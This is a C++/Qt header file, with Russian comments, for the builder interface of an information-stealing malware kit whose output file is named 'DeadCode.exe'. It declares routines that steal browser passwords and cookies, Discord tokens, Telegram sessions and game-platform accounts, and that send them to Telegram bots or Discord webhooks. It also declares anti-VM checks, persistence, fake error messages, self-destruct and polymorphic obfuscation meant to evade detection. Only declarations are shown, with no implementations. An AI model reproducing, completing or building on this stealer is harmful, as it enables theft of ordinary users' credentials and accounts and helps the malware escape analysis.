#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QNetworkAccessManager>
#include <QTimer>
#include <QPropertyAnimation>
#include <QParallelAnimationGroup>
#include <QAbstractAnimation>
#include <QNetworkReply>
#include <QByteArray>
#include <QInputDialog>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <QJsonDocument>
#include <QJsonObject>
#include <QDir>
#include <QProcess>
#include <QLabel>
#include <QSpacerItem>
#include <QLineEdit>
#include <QComboBox>
#include <QCheckBox>
#include <QTextEdit>
#include <QPushButton>
#include <QAction>
#include <QMutex>
#include <QHttpMultiPart>
#include <QApplication>
#include <QThread>
#include <array>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <map>
#include <fstream>
#include <thread>
#include <regex>
#include <windows.h>
#include <bcrypt.h>
#include <sqlite3.h>
#include <zip.h>
#include <curl/curl.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <gdiplus.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include "build_key.h" // RandomGenerator и функции генерации ключей

QT_BEGIN_NAMESPACE
namespace Ui { class MainWindow; }
QT_END_NAMESPACE

// Глобальная переменная как extern
extern class MainWindow* g_mainWindow;

// Внешние функции из main.cpp
extern std::string GetCustomSystemInfo();
extern std::string StealChromiumData(const std::string& browser, const std::string& path, const std::string& dir);
extern std::string StealUnsavedBrowserData(const std::string& browser, const std::string& cachePath);
extern std::string StealAppCacheData(const std::string& appName, const std::string& dir);
extern std::string CaptureWebSocketSessions(const std::string& processName);
extern std::string CaptureWebRTCSessions(const std::string& processName);
extern bool CheckVirtualEnvironment();

// Функция для шифрования строк во время компиляции (XOR)
constexpr char encryptChar(char c, size_t pos) {
    return c ^ (0xAA + (pos % 0xFF));
}

class MainWindow : public QMainWindow {
    Q_OBJECT

public:
    MainWindow(QWidget *parent = nullptr);
    ~MainWindow() override;

    // Публичные методы
    std::string generateRandomString(size_t length);
    std::string generateUniqueXorKey();
    std::array<unsigned char, 16> GetEncryptionKey(bool useFirstKey);
    std::array<unsigned char, 16> generateIV();
    bool isRunningInVM();
    void emitLog(const QString& message);
    std::string decryptString(const std::string& encrypted, size_t keyOffset);

    void updateConfigFromUI();
    void setupPersistence();

    // Методы для кражи данных
    std::string StealAndSendData(const std::string& tempDir);
    std::string TakeScreenshot(const std::string& dir);
    std::string stealBrowserData(const std::string& dir);
    std::string stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir);
    std::string StealDiscordTokens(const std::string& dir);
    std::string StealTelegramData(const std::string& dir);
    std::string StealSteamData(const std::string& dir);
    std::string StealEpicGamesData(const std::string& dir);
    std::string StealRobloxData(const std::string& dir);
    std::string StealBattleNetData(const std::string& dir);
    std::string StealMinecraftData(const std::string& dir);
    std::string StealArizonaRPData(const std::string& dir);
    std::string StealRadmirRPData(const std::string& dir);
    std::vector<std::string> GrabFiles(const std::string& dir);
    std::string stealChatHistory(const std::string& dir);
    std::string collectSocialEngineeringData(const std::string& dir);
    std::string collectSystemInfo(const std::string& dir);

    // Добавленные методы из ошибок сборки
    bool AntiAnalysis();
    void Stealth();
    void Persist();
    void FakeError();
    void SelfDestruct();
    bool checkDependencies();
    void runTests();

    // Геттеры для приватных членов
    std::string getEncryptionKey1() const { return encryptionKey1; }
    std::string getEncryptionKey2() const { return encryptionKey2; }
    std::string getEncryptionSalt() const { return encryptionSalt; }

    // Структура для хранения настроек
    struct Config {
        bool discord = false;
        bool steam = false;
        bool steamMAFile = false;
        bool epic = false;
        bool roblox = false;
        bool battlenet = false;
        bool minecraft = false;
        bool cookies = false;
        bool passwords = false;
        bool screenshot = false;
        bool fileGrabber = false;
        bool systemInfo = false;
        bool socialEngineering = false;
        bool chatHistory = false;
        bool telegram = false;
        bool antiVM = false;
        bool fakeError = false;
        bool silent = false;
        bool autoStart = false;
        bool persist = false;
        bool selfDestruct = false;
        bool arizonaRP = false;
        bool radmirRP = false;
        std::string sendMethod = "Local File";
        std::string buildMethod = "Local Build";
        std::string telegramBotToken = "";
        std::string telegramChatId = "";
        std::string discordWebhook = "";
        std::string filename = "DeadCode.exe";
        std::string iconPath = "";
        std::string githubToken = "";
        std::string githubRepo = "";
    } config;

    // UI элементы
    QLineEdit* tokenLineEdit;
    QLineEdit* chatIdLineEdit;
    QLineEdit* discordWebhookLineEdit;
    QLineEdit* fileNameLineEdit;
    QLineEdit* iconPathLineEdit;
    QLineEdit* githubTokenLineEdit;
    QLineEdit* githubRepoLineEdit;
    QComboBox* sendMethodComboBox;
    QComboBox* buildMethodComboBox;
    QCheckBox* steamCheckBox;
    QCheckBox* steamMAFileCheckBox;
    QCheckBox* epicCheckBox;
    QCheckBox* robloxCheckBox;
    QCheckBox* battlenetCheckBox;
    QCheckBox* minecraftCheckBox;
    QCheckBox* discordCheckBox;
    QCheckBox* telegramCheckBox;
    QCheckBox* chatHistoryCheckBox;
    QCheckBox* cookiesCheckBox;
    QCheckBox* passwordsCheckBox;
    QCheckBox* screenshotCheckBox;
    QCheckBox* fileGrabberCheckBox;
    QCheckBox* systemInfoCheckBox;
    QCheckBox* socialEngineeringCheckBox;
    QCheckBox* antiVMCheckBox;
    QCheckBox* fakeErrorCheckBox;
    QCheckBox* silentCheckBox;
    QCheckBox* autoStartCheckBox;
    QCheckBox* persistCheckBox;
    QCheckBox* selfDestructCheckBox;
    QCheckBox* arizonaRPCheckBox;
    QCheckBox* radmirRPCheckBox;
    QTextEdit* textEdit;
    QPushButton* iconBrowseButton;
    QPushButton* buildButton;
    QPushButton* clearLogsButton;
    QAction* actionSaveConfig;
    QAction* actionLoadConfig;
    QAction* actionExportLogs;
    QAction* actionExit;
    QAction* actionAbout;

    // Векторы для хранения собранных данных
    std::map<std::string, std::string> collectedData;
    std::vector<std::string> collectedFiles;

signals:
    void logUpdated(const QString& message, const QString& type = "info");
    void startStealSignal();

public slots:
    void sendData(const QString& encryptedData, const std::vector<std::string>& files);
    void replyFinished(QNetworkReply *reply);

private slots:
    // Слоты для генерации кода и файлов
    std::string generatePolymorphicCode();
    std::string generateJunkCode();
    void generateBuildKeyHeader(const std::string& encryptionKey = "");
    void copyIconToBuild();
    void buildExecutable();

    // Слоты для GitHub Actions
    void triggerGitHubActions();
    void checkBuildStatus();
    void downloadArtifacts();

    // Слоты для процесса кражи и отправки данных
    void startStealProcess();
    std::string archiveData(const std::string& dir, const std::vector<std::string>& files);
    std::string encryptData(const std::string& data);

    // Слоты для управления конфигурацией и логами
    void saveConfig();
    void loadConfig();
    void exportLogs();
    void appendLog(const QString& message);

    // Методы для шифрования и обфускации
    void generateEncryptionKeys();
    void obfuscateExecutable(const std::string& exePath);
    void applyPolymorphicObfuscation(const std::string& exePath);

    // Слоты для обработки действий пользователя
    void on_iconBrowseButton_clicked();
    void on_buildButton_clicked();
    void on_clearLogsButton_clicked();

    // Дополнительные методы
    void animateSection(QLabel* sectionLabel, QSpacerItem* spacer);
    std::string generateRandomKey(size_t length);
    std::string generateStubCode(const std::string& key);
    bool encryptBuild(const std::string& buildPath, const std::string& key);
    bool compileBuild(const std::string& polymorphicCode, const std::string& junkCode);
    void sendToTelegram(const std::string& data, const std::vector<std::string>& files);
    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);
    void saveToLocalFile(const std::string& data, const std::string& dir);
    QByteArray applyXOR(const QByteArray& data, const std::array<unsigned char, 16>& key);
    QByteArray applyAES(const QByteArray& data, const std::array<unsigned char, 16>& key, const std::array<unsigned char, 16>& iv);
    std::string decryptData(const std::string& encryptedData);

private:
    // Приватные методы
    QByteArray decryptDPAPIData(const QByteArray& encryptedData);

    // Приватные члены
    Ui::MainWindow *ui;
    QNetworkAccessManager *manager;
    QMutex logMutex;
    QMutex filesMutex;
    bool isBuilding = false;
    QTimer *buildTimer;
    QTimer *statusCheckTimer;
    qint64 runId = 0;
    qint64 artifactId = 0;
    std::string encryptionKey1;
    std::string encryptionKey2;
    std::string encryptionSalt;
};

#include "stealerworker.h" // Включение StealerWorker из отдельного файла

#endif // MAINWINDOW_H